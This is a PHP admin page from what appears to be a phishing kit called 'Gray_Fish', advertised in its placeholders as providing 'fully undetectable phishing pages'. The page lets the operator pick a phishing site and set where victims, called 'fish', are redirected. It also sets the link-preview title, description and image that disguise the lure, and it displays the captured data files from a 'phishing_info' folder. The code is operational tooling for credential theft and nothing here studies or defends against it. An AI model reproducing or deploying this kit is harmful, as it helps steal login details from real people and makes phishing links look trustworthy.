<?php if(!empty($_SERVER["HTTP_REFERER"])){$ref=$_SERVER["HTTP_REFERER"];if(substr_count($ref,"/admin/")=='1'){include 'meta_and_redirect_changer.php';$dir='../.././sites/phishing_info/';echo '<style>.inputs{position:relative;height:auto;box-sizing:border-box;padding:10px;font-size:16px}.clps{background-color:#0ba46f;color:white;cursor:pointer;padding:18px;margin-left:16%;width:68%;height:auto;border:10px solid #000;text-align:left;outline:0;font-size:15px}.active,.clps:hover{background-color:#737373}.content{padding:0 18px;display:none;overflow:hidden;background-color:#d9d9d9}</style><button class=clps><div style=font-size:150%;text-align:center;><b>🔑 Security</b></div></button><div class=content><p><center><form action=./user_changer.php method=post><p><b>Its a good idea to use a strong username and password that you dont use elsewhere.</b></p><input maxlength=40 size=30px type=text class=inputs name=username placeholder="Create new username" required=autofocus=><br><input maxlength=40 size=30px type=password class=inputs name=password placeholder="Create new password" required=autofocus=><br><br><input type=checkbox required> I am 100% sure<br><br><button type=submit style="color:#000;background-color:#fff;border:7px solid #000;width:120px;height:50px"><b>Confirm</b></button></form></center></p></div><script>var a=document.getElementsByClassName("clps"),b;for(b=0;b<a.length;b++)a[b].addEventListener("click",function(){this.classList.toggle("active");var c=this.nextElementSibling;c.style.display="block"===c.style.display?"none":"block"});</script>';echo '<br><br><br><br><style>.bt{margin-bottom:5px;margin-left:40%;color:#fff;background-color:#6AA9D2;font-size:90%;border-radius:30%;border:7px solid #000;width: 24%;height: 50px;}</style><a href=.././dashboard.php ><button class=bt><b>Back</b></button></a>';echo '<br><br><br><br><hr><hr><hr><br><style>body{background-color:#D9D9D9;}</style><center><form method=post action=meta_and_redirect_changer.php><br><b>Settings for: </b><select name=selected style=width:300px; >';if(is_dir($dir)){if($dh=opendir($dir)){while(($file=readdir($dh))!==false){if($file!='..'){echo '<option value='.$file.'>'.$file.'</option>';}}closedir($dh);}}echo '</select><br><b>Redirect fish to: </b><input style=background-color:#fff; size=40px type=url  placeholder=https://youtu.be/7U-RbOKanYs name=redirect required><br><b>Preview Title: </b><input size=40px style=background-color:#fff; name=title placeholder=Gray_Fish_v19.09 required><br><b>Preview Description: </b><input size=40px  style=background-color:#fff; name=description placeholder=Gray_Fish_provides_fully_undetectable_phishing_pages. required><br><b>Preview Image link: </b><input size=40px style=background-color:#fff; type=url placeholder=https://i.ibb.co/PmH73X4/index.png name=image required><br><br><button style="background-color:#11918f;color:white;width:115px;height:115px;border:10px solid #000;border-radius:50%;text-align:center;font-size:15px;" type=submit /><b>Do it</b></button></form></center><br><hr><hr><hr><br><br><br><br>';$a=scandir($dir);echo '<ol>';echo '<h1><li>'.$a[2].'</li></h1>';highlight_file($dir.$a[2]);echo '<hr><br>';echo '<h1><li>'.$a[3].'</li></h1>';highlight_file($dir.$a[3]);echo '<hr><br>';echo '<h1><li>'.$a[4].'</li></h1>';highlight_file($dir.$a[4]);echo '<hr><br>';echo '<h1><li>'.$a[5].'</li></h1>';highlight_file($dir.$a[5]);echo '<hr><br>';echo '</ol>';}else{echo'<script>window.location.replace(".././dashboard.php");</script>';}}else{echo'<script>window.location.replace(".././dashboard.php");</script>';}?>